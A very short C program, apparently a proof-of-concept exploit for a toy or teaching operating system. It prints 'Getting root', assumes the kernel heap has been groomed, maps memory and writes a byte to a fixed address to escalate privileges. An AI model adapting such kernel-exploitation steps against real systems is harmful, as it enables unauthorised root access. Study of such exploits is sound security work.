#include "userlib.h"

#define MMAP_VIRT_ADDR ((0x0D048000))

int main () {
	swrite(0, "Getting root\n");
	swrite(0, "assumption: kernel heap has been groomed\n");

	mmap();
	uint8_t *mmap_virt = (uint8_t *)MMAP_VIRT_ADDR;
	mmap_virt[0] = 0x80;

	return 0;
}